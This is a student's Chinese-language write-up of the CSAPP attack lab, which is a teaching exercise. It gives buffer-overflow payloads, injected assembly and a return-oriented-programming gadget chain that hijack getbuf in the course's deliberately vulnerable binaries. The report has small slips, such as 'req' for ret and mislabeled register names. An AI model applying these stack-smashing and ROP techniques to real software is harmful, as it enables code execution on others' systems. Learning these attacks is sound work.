# attacklab 实验报告

## CI

### 第一关

实验文档的提示以及很详细了。先找到 getbuf，发现缓冲区的长度为 24 字节；

然后找到 touch1 的地址为 `0x0000000000401695`；

只需先用任意字符串填充缓冲区的 24 字节，然后将后面 return address 的 8 个字节覆盖为 touch1 的地址即可，注意小端法。

```c
00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03
95 16 40 00 00 00 00 00
```



### 第二关

这里需要在进入 touch2 之前，提前修改 %rdi 的值，我们可以在栈上注入代码；

我们需要先找到调用 Gets 函数时的栈顶地址，因为这里的栈底地址是固定为 `0x00007fffffffffff`，因此无论运行多少次，走到 Gets 的时候栈顶地址都一定是固定的；

使用 `info regi` 指令，得知此时的栈顶地址为 `0x55654c98`，我们就在这 24 字节长的缓冲区中，注入我们的攻击代码；

攻击代码的汇编形式如下：

```assembly
pushq $0x4016c1 # touch2
movq $0x3d9549ca, %rdi
req
```

使用实验文档的方式得到带有字节代码的汇编代码：

```assembly

ctarget.l2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	68 c1 16 40 00       	pushq  $0x4016c1
   5:	48 c7 c7 ca 49 95 3d 	mov    $0x3d9549ca,%rdi
   c:	c3                   	retq   

```

注入的代码的字节码为：`68 c1 16 40 00 48 c7 c7 ca 49 95 3d c3`。由于长度不足 24 字节，因此使用任意字符 `0x0a` 除外填充至 24 字节，跟上栈顶地址 `0x55654c98`。

```c
68 c1 16 40 00 48 c7 c7 ca 49 95 3d c3 00 00 00 00 00 00 00 00 00 00 00
98 4c 65 55 00 00 00 00
```



### 第三关

这和第二关的区别是，这里需要把 %rdi 赋值为 "3d9549ca" 字符串的首地址，而这个 "3d9549ca" 也需要我们在栈区上注入；

根据实验文档的提示，`调用*hexmatch*和*strncmp*函数时，会将数据压入栈中，覆盖*getbuf*使用的缓冲区的内存，你需要很小心把你的cookie字符串表示放在哪里`。

如果我们把字符串存在 getbuf 的缓冲区中，则 hexmatch 函数中进行比较的时候，%rdi 寄存器存储的地址依然在 getbuf 缓冲区，但是这是我们的 cookie 字符串已经被 hexmatch 函数破坏了；

因此我们需要将 cookie 字符串注入到一个不会被影响的地方。

经过断点调试，发现 getbuf 栈帧开始的 24 个字节，会被 hexmatch 和 strncmp 函数破坏，因此我们只需将 cookie 字符串存到这个区域外，且不能和 getbuf 的 return address 区冲突即可。

那么不妨存到 `0x55654cb8`，我们将 cookie `3d9549ca` 转为对应 ASCII 码的十六进制表示：`33 64 39 35 34 39 63 61`。

注入的代码：

```assembly
pushq $0x4017ad # touch3
movq $0x55654cb8, %rdi
req
```

```assembly
   0:	68 ad 17 40 00       	pushq  $0x4017ad
   5:	48 c7 c7 b8 4c 65 55 	mov    $0x55654cb8,%rdi
   c:	c3                   	retq   
```

`68 ad 17 40 00 48 c7 c7 b8 4c 65 55 c3`

```c
68 ad 17 40 00 48 c7 c7 b8 4c 65 55 c3 00 00 00 00 00 00 00 00 00 00 00
98 4c 65 55 00 00 00 00
33 64 39 35 34 39 63 61
```



## ROP

由于采取了下面两种防护技术：

1. 采用了随机化，每次运行栈的位置都不同。所以无法决定你的注入代码应该放在哪里。
2. 将保存栈的内存区域设置为不可执行，所以即使你能把注入的代码的起始地址放到程序计数器中，程序也会报段错误失败。

查看栈顶地址变得没有意义了，因为每次都不一样。但是只有 Stack 栈底的地址会随机化，Text 区的函数入口们的地址并不会变化，因此可以将 return address 改为这些地址，利用多个片段汇编代码，实现我们的攻击逻辑。

下面是一些常用的 gadget：

![图2](https://course.educg.net/userfiles/markdown/exp/2022_1/748ll1643203261.jpg)

### 第二关

我们能使用的指令如下：

> *movq*：代码如图2A所示。
>
> *popq*；代码如图2B所示。
>
> *ret*：该指令编码为0xc3。
>
> *nop*：该指令编码为0x90。

我们可以将 cookie 存到栈上，使用 pop 指令将其出栈后推导寄存器中。但是 farm 中没有 `popq %rdi`。经过翻找，发现只有一个 `58 90 c3`，可以满足 `popq %rax` 然后 `retq`：

```assembly
0000000000401873 <addval_385>:
  401873:	8d 87 00 58 90 c3    	lea    -0x3c6fa800(%rdi),%eax
  401879:	c3                   	retq   
```

我们只能先 `popq %rax`，然后 `movq %rax %rdi`。翻找后发现 `movq %rax %rdi`(48 89 c7) 有两处：

```assembly
0000000000401858 <setval_422>:
  401858:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
  40185e:	c3                   	retq   
  
0000000000401866 <setval_246>:
  401866:	c7 07 48 89 c7 c3    	movl   $0xc3c78948,(%rdi)
  40186c:	c3                   	retq   
```

先把前 24 个字节填上，它们没用了；

从 return address 开始，先让 getbuf 的 retq 到 `popq %rdi` 指令地址 `0x761840`(小端法)；

此时 getbuf 的 retq 操作已经把 24 个字节后的第一个 8 字节出栈了，此时 %rsp 指向第二个 8 字节，我们手动触发的 popq 操作会把这第二个 8 字节传到 %rax，因此我们必须把 cookie 的立即数存储到这第二个 8 字节 `0xca49953d`(小端法)；

完成后 %rsp 指向第三个 8 字节，addval_385 在执行完 `popq %rax` 后会执行 retq，再一次出栈并跳转，因此我们把 `movq %rax %rdi` 的地址放到第三个 8 字节中 `0x5a1840`(小端法)；

此时 %rsp 指向第四个 8 字节，这里就放 touch2 的地址，用于被 setval_422 的 retq 调用跳转 `0xc11640`(小端法)；

```c
00 01 02 03 04 05 06 07 08 09 00 01 02 03 04 05 06 07 08 09 00 01 02 03
76 18 40 00 00 00 00 00
ca 49 95 3d 00 00 00 00
5a 18 40 00 00 00 00 00
c1 16 40 00 00 00 00 00
```



